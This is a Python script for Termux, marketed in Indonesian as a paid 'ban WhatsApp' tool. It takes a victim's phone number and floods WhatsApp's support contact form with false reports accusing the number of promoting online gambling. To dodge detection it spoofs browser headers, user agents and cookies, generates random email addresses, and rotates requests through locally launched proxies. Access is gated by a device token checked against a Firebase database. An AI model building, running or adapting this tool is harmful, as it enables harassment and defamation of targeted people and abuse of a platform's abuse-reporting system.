import os
import time
import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from rich.align import Align
from rich.prompt import Prompt
import json
import subprocess
import random
import threading
from datetime import datetime, timedelta
from fake_useragent import UserAgent
import string
import uuid

console = Console()

USER_LOGO = """[bold red]⢀⣠⣴⣖⣺⣿⣍⠙⠛⠒⠦⣤⣀                        ⢀⣠⡤⠖⠚⠋⠉⣿⣟⣒⣶⣤⣀
⠙⠉⠉⠉⠉⠙⠛⢶⣶⡦  ⠉⠳⣤                    ⢀⡴⠛⠁  ⣶⣶⠞⠛⠉⠉⠉⠉⠙
        ⠈⠛⢿⣟⣀⡀⠈⠳⣄                ⢀⡴⠋ ⢀⢐⣿⠟⠋        
           ⠙⢿⡟  ⠘⢷⡀    ⡀        ⣰⠟⠁ ⠘⣿⠟⠁          
             ⠻⣿⠃  ⢻⣆⠼⣷⣤⣇⣱⣶⣸⣧⣴⡦⢔⣶⠃  ⢻⡿⠃            
              ⠘⣿⠿⠉⠛⣿⣷⣿⣿⣿⣿⣼⣿⣿⣿⣷⣿⡟⠋⠹⣿⡟⠁             
               ⣸⣦⡶⠟⠛⠛⠿⠿⠋  ⠈⠻⠿⠟⠋⠛⠷⣦⣞⡀              
            ⢀⣴⠟⠛⢻⡄               ⣼⠛⠛⠷⣄            
           ⣠⠟   ⠈⣷ ⣀⣀⡀      ⢀⣀⣤⡀⢰⡏   ⠈⠳⡄          
         ⣠⠞⣁⣠⣤⣤⡤⠴⣿ ⢸⣨⣿⣧⣀⣀⣀⣀⣠⣾⣧⣸ ⢸⡷⠦⣤⣤⣤⣄⡘⢦⡀        
      ⣀⡤⣞⣷⣾⣿⠿⠛⠁  ⣿⡀ ⠛⠿⠿⠋⣉⢋⣉⠙⠿⠟⠃ ⣸⡇  ⠙⠻⢿⣿⣶⣝⣦⣄⡀     
  ⠈⠛⠛⠛⠓⠛⠛⠉⠁      ⠘⢷⡀⠠⣀  ⠈⡟⠁ ⢀⡠ ⣰⠟       ⠉⠙⠛⠛⠛⠛⠛⠋  
                   ⠙⢦⡈⢳⡀ ⠁ ⡰⠋⣰⠞⠁                  
                 ⣀⣤⣤⣾⣿⡖⠃   ⠃⣾⣿⣦⣤⣄⡀                
               ⣴⣿⣿⣿⣿⣿⣿⣟⠓⢶⣴⠞⠚⣿⣿⣿⣿⣿⣿⣷⡀              
           ⠤⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡛⠲⣶⣿⡶⠚⣹⣿⣿⣿⣿⣿⣿⣿⣦⣀⡀           
        ⠈⠙⠒⠒⠋⣹⣿⠟⢹⣿⣿⣿⣿⣿⣷⣤⣬⣥⣤⣴⣿⣿⣿⣿⣿⣿⡙⣿⣿⡉⠑⠒⠂         
         ⠑⠂⢤⣴⣏⣾⣴⡿⣿⣿⣿⣿⣿⣿⣿⠞⠙⢾⣿⣿⣿⣻⣿⣿⣿⣧⣼⣏⣷⣤⠄⠂         
        ⠒⠒⠚⠉ ⢹⢋⡿⠉⢹⢻⡟⣿⣿⣯⢿⣆⢀⣾⢯⣿⣿⡟⣿⢻⡉⠹⣏⢻⠁ ⠙⠒⠒        
            ⣠⠋⠁⢀⡴⣻⣸⡿⠿⡏⡇⠈⣿⣿⡏⠈⡛⡿⠿⣿⣘⡷⣄⡀⠉⢳⡀           
           ⠊⠉⠉⠉⠁⠙⢁⠞  ⡷⠁⣠⠋⡟⢣⡀⠱⡇ ⠈⢆⠙⠁⠉⠉⠉⠉⠒          
              ⢀⡠⠖⠁  ⢠⡿⠚⠁   ⠙⠲⣤   ⠑⠢⢄              
                   ⢀⡜        ⠑⠄                   
[bold white]          DIZFLYZE SCRIPT BANNED WHATSAPP[/bold white]"""

MAIN_LOGO = USER_LOGO

FIREBASE_URL = "https://chatglobal-1e541-default-rtdb.asia-southeast1.firebasedatabase.app"

class AplikasiPengguna:
    def __init__(self):
        self.database_url = FIREBASE_URL
        self.tokenmasuk = self.DapatkanDeviceId()
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
                
    def DapatkanDeviceId(self):
        device_file = "/data/data/com.termux/files/usr/bin/id.txt"
        if os.path.exists(device_file):
            with open(device_file, "r") as f:
                return f.read().strip()
        else:
            new_tokenmasuk = str(uuid.uuid4())
            with open(device_file, "w") as f:
                f.write(new_tokenmasuk)
            return new_tokenmasuk
    
    def TampilLogo(self):
        self.clear_screen()
        console.print(
            Panel(
                Align.center(USER_LOGO),
                title="[bold cyan]WELCOME MY SCRIPT[/bold cyan]",
                style="bold red"
            )
        )
    
    def FiturPremium(self):
        fitur_content = """    ┏┓┏┓┳┓┳┏┓┏┳┓  ┳┓┏┓┳┓┳┓┏┓┳┓  ┓ ┏┓┏┏┓┏┳┓┏┓┏┓┏┓┏┓    
━━  ┗┓┃ ┣┫┃┃┃ ┃   ┣┫┣┫┃┃┃┃┣ ┃┃  ┃┃┃┣┫┣┫ ┃ ┗┓┣┫┃┃┃┃  ━━
    ┗┛┗┛┛┗┻┣┛ ┻   ┻┛┛┗┛┗┛┗┗┛┻┛  ┗┻┛┛┗┛┗ ┻ ┗┛┛┗┣┛┣┛    
                                                      
🎁 [bold white]FITUR [white]Yang Kamu Dapatkan Setelah Menjadi User [bold white]PREMIUM ADALAH [white]Sebagai Berikut![/bold white]

[bold green]▶ ⚡ AUTO BANNED PERMANEN[/bold green]
[bold green]▶ 👑 BANNED ANTI BISA DI BUKA LAGI[/bold green]
[bold green]▶ 🔄 FREE UPDATE UNLIMITED[/bold green]
[bold green]▶ 🔥 PENGGUNAAN UNLIMITED[/bold green]
[bold green]▶ 🍁 BISA BUKA JASA BAN SENDIRI[/bold green]
[bold green]▶ 🔐 AUTO BYPASS AI SUPPORT TERBARU[/bold green]
[bold green]▶ 📤 AUTO INJECTED WHATSAPP PYLOAD[/bold green]
[bold green]▶ 🤙 WORK 100% NOMER INDO ONLY[/bold green]

[bold white]🎯 JIKA INGIN MENJADI USER VIP SILAHKAN
[bold white]🚀 HUBUNGI [bold green]: [bold cyan]t.me/dizflyzeofc"""

        console.print(
            Panel(
                fitur_content,
                title="[bold yellow]👋 SELAMAT DATANG PENGGUNA 😁[/bold yellow]",
                style="bold magenta"
            )
        )
        
        console.print(
            Panel(
                f"[bold white]🌐 TOKEN : {self.tokenmasuk}[/bold white]",
                title="[bold cyan]SALIN TOKEN ANDA[/bold cyan]",
                style="bold white"
            )
        )
    
    def PeriksaDatabaseDenganLoading(self):
        with Progress(
            SpinnerColumn("dots", style="bold cyan"),
            TextColumn("[bold green]TUNGGU BENTAR[/bold green]"),
            BarColumn(bar_width=40, complete_style="bold cyan"),
            transient=True,
        ) as progress:
            task = progress.add_task("", total=100)
            for i in range(100):
                progress.update(task, advance=1)
                time.sleep(0.05)
                
    def PeriksaDatabase(self):
        self.PeriksaDatabaseDenganLoading()
        
        try:
            response = requests.get(f"{self.database_url}/users.json", timeout=10)
            users = response.json()
            
            if users:
                for user_id, user_data in users.items():
                    if user_data.get('tokenmasuk') == self.tokenmasuk and user_data.get('status') == 'active':
                        return True
            return False
        except:
            return False
    
    def MainkanPremiumUser(self):
        self.TampilLogo()
        self.FiturPremium()
        terdaftar = self.PeriksaDatabase()
        
        if not terdaftar:
            console.print(
                Panel(
                    "[bold yellow]❌ Selamat Datang Free User\n"
                    "❌ Tidak Di Izinkan Masuk Karena Belum Premium[/bold yellow]",
                    title="[bold cyan]👋 KAMU USER BIASA 🍁[/bold cyan]",
                    style="bold red"
                )
            )
            os.system(f"xdg-open https://t.me/dizflyzeofc?text=Halo%20Bang%20Diz%20Mau%20Jadi%20User%20Premium%20Bayar%20Berapa%20Ya%3F%0A%0ABtw%20Ini%20Bang%20Device%20ID%20Saya%20Nanti%20Di%20Jadiin%20Premium%20:%20{self.tokenmasuk}")
            return False
        else:
            console.print(
                Panel(
                    "[bold yellow]✅ Selamat Datang User Premium\n"
                    "✅ Silahkan ENTER Dan Banned Nomer Target Kamu![/bold yellow]",
                    title="[bold green]👋 KAMU USER PREMIUM 🍁[/bold green]",
                    style="bold green"
                )
            )
            Prompt.ask("[bold white]ENTER[/bold white] Untuk Masuk")
            os.system(f"xdg-open https://t.me/dizflyzeofc?text=Makasih%20Bang%20Udah%20Bisa%20Masuk%0A🤙%20Amanah%20Nih%20Admin")
            return True
    
    def MainkanScriptUtama(self):
        self.clear_screen()
        self.MainScript()
    
    def MainScript(self):
        limit_hours = 24
        FileLogSystem = "/sdcard/Alarms/Termux_Config_Time.json"

        def clear():
            os.system('clear' if os.name == 'posix' else 'cls')

        def setup_proxy(port):
            if not os.path.exists("/data/data/com.termux/files/usr/bin/tinyproxy"):
                os.system("pkg install tinyproxy -y")
            config_path = f"/data/data/com.termux/files/usr/etc/tinyproxy_{port}.conf"
            if not os.path.exists(config_path):
                os.system(f"echo 'Port {port}\nAllow 127.0.0.1' > {config_path}")
            subprocess.Popen(["tinyproxy", "-c", config_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            return f"127.0.0.1:{port}"

        def validate_proxy(proxy):
            try:
                test_url = "http://httpbin.org/ip"
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                r = requests.get(test_url, proxies=proxies, timeout=10)
                return r.status_code == 200
            except:
                return False

        def random_user_agent():
            return UserAgent().random

        def random_cookies():
            csrf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            return {
                'wa_csrf': csrf_token,
                'wa_lang_pref': 'id',
                'wa_ul': session_id
            }

        def random_string(length=10):
            return ''.join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(length))

        def send_report(phone_number, proxies):
            url = 'https://www.whatsapp.com/contact/noclient/async/new/'
            
            report_texts = [
                f"🌟 *SITUS JUDI ONLINE TERPERCAYA & TERVERIFIKASI* 🌟\n\n✅ Lisensi Resmi Internasional\n✅ Sistem Keamanan Terenkripsi\n✅ Proses Deposit & Withdraw Cepat\n✅ Customer Service 24/7 Professional\n\n🎰 *JACKPOT HINGGA 200 JUTA!* 🎰\nDengan deposit minimal 50rb, kesempatan menang besar terbuka lebar!\n\n📱 *HUBUNGI ADMIN DI WHATSAPP:*\n[+62{phone_number}]\n\n🔒 *Terjamin Keamanannya & Terpercaya Sejak 2018* 🔒",
                f"🦅 *GARUDA MANTAP - PLATFORM PREMIUM* 🦅\n\n⭐ *BONUS TERBAIK DI INDUSTRI:*\n• Bonus New Member 200%\n• Bonus Harian hingga 500%\n• Cashback Mingguan 15%\n• Bonus Referral Seumur Hidup\n\n💎 *FITUR UNGGULAN:*\n• WD Tanpa Batas & Cepat\n• Sistem Fair Play Terjamin\n• 100+ Game Slot Terlengkap\n\n📞 *KONTAK ADMIN DI WHATSAPP:*\n[+62{phone_number}]\n\n🛡️ *Legal & Terverifikasi Badan Internasional* 🛡️",
                f"🗽 *NEW YORK SLOT - STANDAR INTERNASIONAL* 🗽\n\n🎯 *TEKNOLOGI TERBARU:*\n• RTP Tertinggi 99.9%\n• Sistem Auto Win Terverifikasi\n• Minimal Deposit 10rb\n• WD Berapapun Pasti Dibayar\n\n✨ *KEUNGGULAN:*\n• Support 24 Jam Professional\n• Proses Transaksi Instant\n• Jackpot Progressive Setiap Hari\n\n📲 *HUBUNGI CUSTOMER SERVICE DI WHATSAPP:*\n[+62{phone_number}]\n\n💫 *Terverifikasi & Recommended oleh Para Bettor* 💫",
                f"👑 *ROYAL WIN SLOT - KELAS PREMIUM* 👑\n\n🏆 *PRESTASI TERCATAT:*\n• Win Rate Konsisten 95%\n• Ribuan Member Aktif\n• Rating ⭐⭐⭐⭐⭐ 4.9/5.0\n• Pilihan Bettor Professional\n\n💰 *BONUS EKSKLUSIF:*\n• Welcome Bonus 300%\n• Cashback Kekalahan 20%\n• Bonus Birthday Special\n• Bonus Loyalty Member\n\n📞 *ADMIN DEDICATED SUPPORT DI WHATSAPP:*\n[+62{phone_number}]\n\n🎖️ *Terpercaya & Terverifikasi Secara Legal* 🎖️",
                f"🔥 *MEGA FORTUNE - PLATFORM TERBAIK 2024* 🔥\n\n💎 *FASILITAS WORLD CLASS:*\n• Winrate Terbukti 97%\n• Sistem Anti Rungkad\n• Jackpot Harian Menanti\n• Minimal Deposit 25rb\n\n🚀 *PELAYANAN PREMIUM:*\n• Respons Cepat < 3 Menit\n• Bantuan Transaksi 24/7\n• Konsultasi Game Gratis\n• Tips Menang dari Expert\n\n📱 *KONTAK RESMI MANAGEMENT DI WHATSAPP:*\n[+62{phone_number}]\n\n🏅 *Terverifikasi & Direkomendasikan Komunitas Resmi* 🏅"
            ]
            
            headers = {
                'authority': 'www.whatsapp.com',
                'accept': '/',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.whatsapp.com',
                'referer': 'https://www.whatsapp.com/contact/?subject=messenger',
                'sec-ch-ua': f'"{random.choice(["Not-A.Brand", "Chromium"])}";v="{random.randint(90, 99)}", "Chromium";v="{random.randint(110, 124)}"',
                'sec-ch-ua-mobile': random.choice(['?0', '?1']),
                'sec-ch-ua-platform': f'"{random.choice(["Windows", "Android", "iOS"])}"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': random_user_agent(),                
            }

            proxy = random.choice(proxies)
            proxy_config = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            
            data = {
                'country_selector': 'ID',
                'email': f'{random_string()}@gmail.com',
                'email_confirm': f'{random_string()}@gmail.com',
                'phone_number': phone_number,
                'platform': random.choice(['WHATS_APP_WEB_DESKTOP', 'WHATS_APP_ANDROID']),
                'your_message': random.choice(report_texts),
                'step': 'submit',
            }

            try:
                response = requests.post(url, headers=headers, data=data, proxies=proxy_config, cookies=random_cookies(), timeout=10)
                if response.status_code == 200:
                    console.print(f"\n[bold cyan]╭───────────╯\n╰─> [ 200 ] : +62{phone_number}[/bold cyan]")
                else:
                    console.print(f"\n[bold red]╭───────────╯\n╰─> [ 403 ] : +62{phone_number}[/bold red]")
            except Exception as e:
                console.print(f"\n[bold red]╭───────────╯\n╰─> [ {e} ][/bold red]")

        def load_log():
            if os.path.exists(FileLogSystem):
                with open(FileLogSystem, "r") as f:
                    try:
                        return json.load(f)
                    except:
                        return {}
            return {}

        def save_log(phone_number):
            log_data = load_log()
            log_data[phone_number] = datetime.now().isoformat()
            with open(FileLogSystem, "w") as f:
                json.dump(log_data, f)

        def restart_countdown(remaining_time):
            total = int(remaining_time.total_seconds())
            try:
                from rich.live import Live
                from rich.text import Text
                
                countdown_message = Text("", style="bold yellow")
                
                with Live(countdown_message, refresh_per_second=4, console=console) as live:
                    while total > 0:
                        hours, remainder = divmod(total, 3600)
                        minutes, seconds = divmod(remainder, 60)
                        countdown_message = Text(f"╰─> TUNGGU SAMPAI : {hours:02}:{minutes:02}:{seconds:02}", style="bold yellow")
                        live.update(countdown_message)
                        time.sleep(1)
                        total -= 1
                
                console.print("[bold green]╭───────────╯\n╰─> [ START SPAM REPORT ][/bold green]\n")
                main()
            except ImportError:
                try:
                    while total > 0:
                        hours, remainder = divmod(total, 3600)
                        minutes, seconds = divmod(remainder, 60)
                        print(f"\r╰─> TUNGGU SAMPAI : {hours:02}:{minutes:02}:{seconds:02}", end="", flush=True)
                        time.sleep(1)
                        total -= 1
                    print("\n")
                    console.print("[bold green]╭───────────╯\n╰─> [ START SPAM REPORT ][/bold green]\n")
                    main()
                except KeyboardInterrupt:
                    console.print("\n[bold red]╭───────────╯\n╰─> [ DIHENTIKAN ][/bold red]")
            except KeyboardInterrupt:
                console.print("\n[bold red]╭───────────╯\n╰─> [ DIHENTIKAN ][/bold red]")

        def main():
            clear()
            console.print(Panel(MAIN_LOGO, style="bold red")) 
            console.print(Panel("""[bold white]CREATED : DIZ FLYZE OFFICIAL
[bold white]YOUTUBE : DIZFLYZE999
[bold white]UPDATED : 09-10-2025""",
title="[bold cyan]INFO SCRIPT[/bold cyan]",
style="bold red"))
            console.print(Panel("""[bold white]Ketikan Nomer Target Tanpa +62 Dan Tanpa SPASI Intinya Polos 8xxx Contohnya : 8123456789 Lalu ENTER""",
title="[bold cyan]TARGET BANNED[/bold cyan]",
style="bold red"))
            console.print("[bold red]╭───────────╯")
            phone_number = console.input("[bold red]╰─> [bold white]+62[/bold white][/bold red]")

            if not phone_number.isdigit() or not phone_number.startswith("8") or len(phone_number) < 9:
                console.print("[bold red]╰─> [ MASUKAN NOMER DENGAN BENAR! AWALI 8XX ][/bold red]")
                return

            log_data = load_log()
            if phone_number in log_data:
                last_spam = datetime.fromisoformat(log_data[phone_number])
                remaining_time = timedelta(hours=limit_hours) - (datetime.now() - last_spam)
                if remaining_time.total_seconds() > 0:
                    restart_countdown(remaining_time)
                    return

            save_log(phone_number)

            ports = [8888 + i for i in range(10)]
            proxy_list = []
            for port in ports:
                proxy = setup_proxy(port)
                if validate_proxy(proxy):
                    proxy_list.append(proxy)

            if not proxy_list:
                console.print("[bold red]SERVER DOWN TUNGGU BEBERAPA JAM KEDEPAN[/bold red]")
                return

            def spam_job():
                send_report(phone_number, proxy_list)

            with Progress() as progress:
                task = progress.add_task("[bold cyan]PROSES BANG |", total=10)
                threads = []
                for _ in range(10):
                    t = threading.Thread(target=spam_job)
                    t.start()
                    threads.append(t)
                    progress.update(task, advance=1)
                    time.sleep(random.randint(3, 5))
                for t in threads:
                    t.join()

            restart_countdown(timedelta(hours=limit_hours))

        main()

    def run(self):
        if self.MainkanPremiumUser():
            self.MainkanScriptUtama()

if __name__ == "__main__":
    app = AplikasiPengguna()
    app.run()
